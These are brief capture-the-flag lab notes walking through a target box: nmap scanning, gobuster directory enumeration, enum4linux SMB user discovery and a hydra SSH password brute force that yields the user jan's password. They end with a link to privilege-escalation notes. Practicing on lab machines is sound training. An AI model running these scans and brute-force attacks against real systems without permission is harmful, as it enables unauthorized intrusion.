use nmap
```bash
nmap -sV -sC 10.10.170.85
```

open webserver(80)
enumerate with gobuster
```bash
gobuster dir -u http://10.10.170.85 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```
found /development/ with some info about

use enum4linux to enumerate the smb
```bash
enum4linux 10.10.170.85
```
let it run. get two user
- jan
- kay
bruteforce jan password with hydra
```bash
hydra -l jan -P /home/kali/rockyou.txt ssh://10.10.170.85
```
get password armando

login to the server.

upload(download) enumeration apps.
[[Linux Priv Esc/General]]